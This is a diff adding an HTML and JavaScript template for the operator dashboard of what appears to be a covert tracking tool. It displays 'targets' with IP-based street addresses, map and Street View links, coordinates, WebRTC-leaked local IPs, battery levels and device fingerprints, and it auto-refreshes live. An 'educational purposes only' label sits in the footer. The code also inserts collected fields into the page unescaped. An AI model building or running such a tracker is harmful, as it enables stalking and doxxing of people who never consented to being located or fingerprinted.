@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎯 INTELLIGENCE DASHBOARD</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .dashboard {
+      max-width: 1600px;
+      margin: 0 auto;
+    }
+
+    .header {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 25px 30px;
+      margin-bottom: 25px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+
+    .header-left h1 {
+      font-size: 28px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 5px;
+    }
+
+    .header-left p {
+      color: #666;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .live-badge {
+      background: #ff4757;
+      color: white;
+      padding: 6px 12px;
+      border-radius: 30px;
+      font-size: 13px;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.7; }
+      100% { opacity: 1; }
+    }
+
+    .header-right {
+      display: flex;
+      gap: 15px;
+      align-items: center;
+    }
+
+    .refresh-btn {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .refresh-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+    }
+
+    .total-targets {
+      background: #f8f9fa;
+      padding: 10px 20px;
+      border-radius: 30px;
+      font-size: 14px;
+      color: #333;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .total-targets span {
+      background: #667eea;
+      color: white;
+      padding: 4px 10px;
+      border-radius: 20px;
+      margin-left: 5px;
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 20px;
+      margin-bottom: 25px;
+    }
+
+    .stat-card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+      transition: transform 0.3s;
+    }
+
+    .stat-card:hover {
+      transform: translateY(-5px);
+    }
+
+    .stat-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .stat-icon {
+      width: 45px;
+      height: 45px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      border-radius: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 24px;
+    }
+
+    .stat-header h3 {
+      color: #333;
+      font-size: 14px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .stat-value {
+      font-size: 42px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      line-height: 1;
+      margin-bottom: 5px;
+    }
+
+    .stat-label {
+      color: #666;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .table-container {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+      overflow-x: auto;
+    }
+
+    .table-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+
+    .table-header h2 {
+      color: #333;
+      font-size: 18px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .filter-badge {
+      background: #f0f2f5;
+      padding: 8px 15px;
+      border-radius: 30px;
+      font-size: 13px;
+      color: #666;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .filter-badge select {
+      border: none;
+      background: white;
+      padding: 5px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      color: #333;
+      cursor: pointer;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 14px;
+    }
+
+    th {
+      text-align: left;
+      padding: 15px;
+      background: #f8f9fa;
+      color: #333;
+      font-weight: 600;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 2px solid #e0e0e0;
+    }
+
+    td {
+      padding: 15px;
+      border-bottom: 1px solid #f0f0f0;
+      color: #444;
+    }
+
+    tr:hover {
+      background: #fafafa;
+    }
+
+    .time-cell {
+      font-family: 'Monaco', monospace;
+      font-size: 12px;
+      color: #667eea;
+      font-weight: 600;
+    }
+
+    .address-cell {
+      max-width: 300px;
+    }
+
+    .address-main {
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 5px;
+      line-height: 1.4;
+    }
+
+    .address-links {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .map-link {
+      color: #667eea;
+      text-decoration: none;
+      font-size: 11px;
+      display: inline-flex;
+      align-items: center;
+      gap: 3px;
+      padding: 3px 8px;
+      background: #f0f2f5;
+      border-radius: 15px;
+      transition: background 0.2s;
+    }
+
+    .map-link:hover {
+      background: #e0e4e9;
+    }
+
+    .isp-cell {
+      font-weight: 500;
+    }
+
+    .isp-cell small {
+      display: block;
+      color: #999;
+      font-size: 11px;
+      margin-top: 3px;
+    }
+
+    .coord-cell {
+      font-family: 'Monaco', monospace;
+      font-size: 11px;
+      color: #666;
+    }
+
+    .webrtc-cell {
+      font-family: 'Monaco', monospace;
+      color: #ff4757;
+      font-weight: 600;
+      font-size: 12px;
+    }
+
+    .battery-cell {
+      font-weight: 600;
+    }
+
+    .battery-high {
+      color: #00b894;
+    }
+
+    .battery-medium {
+      color: #f39c12;
+    }
+
+    .battery-low {
+      color: #ff4757;
+    }
+
+    .device-cell {
+      font-size: 12px;
+    }
+
+    .device-cell small {
+      color: #999;
+      font-size: 11px;
+    }
+
+    .no-location {
+      background: #fff5f5;
+    }
+
+    .no-location td {
+      color: #ff4757;
+      font-style: italic;
+    }
+
+    .ip-badge {
+      background: #f0f2f5;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 11px;
+      color: #666;
+      font-family: monospace;
+      margin-left: 10px;
+    }
+
+    .footer {
+      margin-top: 25px;
+      text-align: center;
+      color: rgba(255, 255, 255, 0.8);
+      font-size: 13px;
+      padding: 15px;
+    }
+
+    .footer a {
+      color: white;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    @media (max-width: 768px) {
+      body { padding: 10px; }
+      .header { flex-direction: column; align-items: flex-start; }
+      .header-right { width: 100%; }
+      .refresh-btn { width: 100%; justify-content: center; }
+      .stats-grid { grid-template-columns: 1fr; }
+      td, th { font-size: 12px; padding: 10px; }
+      .address-main { font-size: 12px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="dashboard">
+    <div class="header">
+      <div class="header-left">
+        <h1>🎯 INTELLIGENCE DASHBOARD</h1>
+        <p>
+          <span class="live-badge">🔴 LIVE</span>
+          Real-time tracking data • Auto-refreshes every 5s
+        </p>
+      </div>
+      <div class="header-right">
+        <div class="total-targets">
+          📊 TOTAL TARGETS <span>{{TOTAL_TRACKS}}</span>
+        </div>
+        <button class="refresh-btn" onclick="location.reload()">
+          🔄 REFRESH NOW
+        </button>
+      </div>
+    </div>
+
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-header">
+          <div class="stat-icon">📍</div>
+          <h3>Real Locations</h3>
+        </div>
+        <div class="stat-value">{{REAL_LOCATIONS}}</div>
+        <div class="stat-label">✓ Verified IP geolocation</div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-header">
+          <div class="stat-icon">🚫</div>
+          <h3>No Location</h3>
+        </div>
+        <div class="stat-value">{{NO_LOCATION}}</div>
+        <div class="stat-label">⚡ Private IP / VPN / Proxy</div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-header">
+          <div class="stat-icon">🕵️</div>
+          <h3>WebRTC Leaks</h3>
+        </div>
+        <div class="stat-value">{{WEBRTC_LEAKS}}</div>
+        <div class="stat-label">🌐 Local IP exposed</div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-header">
+          <div class="stat-icon">🔋</div>
+          <h3>Battery Data</h3>
+        </div>
+        <div class="stat-value">{{BATTERY_COUNT}}</div>
+        <div class="stat-label">⚡ Device battery levels</div>
+      </div>
+    </div>
+
+    <div class="table-container">
+      <div class="table-header">
+        <h2>
+          📋 RECENT TRACKS
+          <span class="filter-badge">
+            ⏱️ Last 50 entries
+          </span>
+        </h2>
+        <div class="filter-badge">
+          🔍 View:
+          <select onchange="filterTable(this.value)">
+            <option value="all">All targets</option>
+            <option value="real">With location</option>
+            <option value="no-loc">No location</option>
+            <option value="webrtc">WebRTC leaks</option>
+          </select>
+        </div>
+      </div>
+
+      <table id="tracker-table">
+        <thead>
+          <tr>
+            <th>⏱️ Time</th>
+            <th>📍 Location</th>
+            <th>📡 ISP</th>
+            <th>🌍 Coordinates</th>
+            <th>🕵️ WebRTC</th>
+            <th>🔋 Batt</th>
+            <th>💻 Device</th>
+          </tr>
+        </thead>
+        <tbody id="table-body">
+          <!-- Data will be populated by JavaScript -->
+        </tbody>
+      </table>
+    </div>
+
+    <div class="footer">
+      ⚡ EDUCATIONAL PURPOSES ONLY • Data auto-rotates after 500 entries • 
+      <a onclick="clearData()">🗑️ Clear all data</a>
+    </div>
+  </div>
+
+  <script>
+    const tracksData = JSON.parse('{{TRACKS_DATA}}') || [];
+
+    function renderTable(tracks) {
+      const tbody = document.getElementById('table-body');
+      tbody.innerHTML = '';
+      
+      tracks.forEach(t => {
+        if (!t.geo || !t.geo.real) {
+          const row = document.createElement('tr');
+          row.className = 'no-location';
+          row.innerHTML = `
+            <td class="time-cell">${t.ts ? t.ts.slice(11,19) : '??'}</td>
+            <td colspan="6">
+              🚫 No location data 
+              <span class="ip-badge">IP: ${t.ip || 'unknown'}</span>
+              ${t.fp?.webrtc ? `<span style="color:#999; margin-left:10px;">⚠️ WebRTC leak: ${t.fp.webrtc}</span>` : ''}
+            </td>
+          `;
+          tbody.appendChild(row);
+          return;
+        }
+        
+        const geo = t.geo || {};
+        const fp = t.fp || {};
+        const battery = fp.battery ? (fp.battery.level || fp.battery) : '?';
+        const batteryClass = battery > 70 ? 'battery-high' : (battery > 30 ? 'battery-medium' : 'battery-low');
+        
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td class="time-cell">${t.ts ? t.ts.slice(11,19) : '??'}</td>
+          <td class="address-cell">
+            <div class="address-main">${geo.address || geo.city || 'Unknown'}</div>
+            <div class="address-links">
+              ${geo.mapsLink ? `<a href="${geo.mapsLink}" target="_blank" class="map-link">🗺️ Google Maps</a>` : ''}
+              ${geo.streetView ? `<a href="${geo.streetView}" target="_blank" class="map-link">🌐 Street View</a>` : ''}
+            </div>
+          </td>
+          <td class="isp-cell">
+            ${geo.isp || '?'}
+            <small>${geo.country || ''}</small>
+          </td>
+          <td class="coord-cell">
+            ${geo.lat ? geo.lat.toFixed(4) : '?'}, ${geo.lon ? geo.lon.toFixed(4) : '?'}
+          </td>
+          <td class="webrtc-cell">${fp.webrtc || '—'}</td>
+          <td class="battery-cell ${batteryClass}">${battery}%</td>
+          <td class="device-cell">
+            ${fp.hardware ? fp.hardware.cores || '?' : '?'} cores
+            <small>${fp.canvas ? '✓ FP' : ''}</small>
+          </td>
+        `;
+        tbody.appendChild(row);
+      });
+    }
+
+    function filterTable(filter) {
+      const rows = document.querySelectorAll('#tracker-table tbody tr');
+      rows.forEach(row => {
+        switch(filter) {
+          case 'all':
+            row.style.display = '';
+            break;
+          case 'real':
+            row.style.display = row.classList.contains('no-location') ? 'none' : '';
+            break;
+          case 'no-loc':
+            row.style.display = row.classList.contains('no-location') ? '' : 'none';
+            break;
+          case 'webrtc':
+            const webrtcCell = row.querySelector('.webrtc-cell');
+            const hasWebRTC = webrtcCell && webrtcCell.innerText !== '—' && webrtcCell.innerText !== 'None';
+            row.style.display = hasWebRTC ? '' : 'none';
+            break;
+        }
+      });
+    }
+
+    async function clearData() {
+      if (confirm('Delete all tracking data? This cannot be undone.')) {
+        await fetch('/clear', { method: 'POST' });
+        location.reload();
+      }
+    }
+
+    // Auto-refresh every 5 seconds
+    setTimeout(() => location.reload(), 5000);
+
+    // Initial render
+    renderTable(tracksData);
+  </script>
+</body>
+</html>
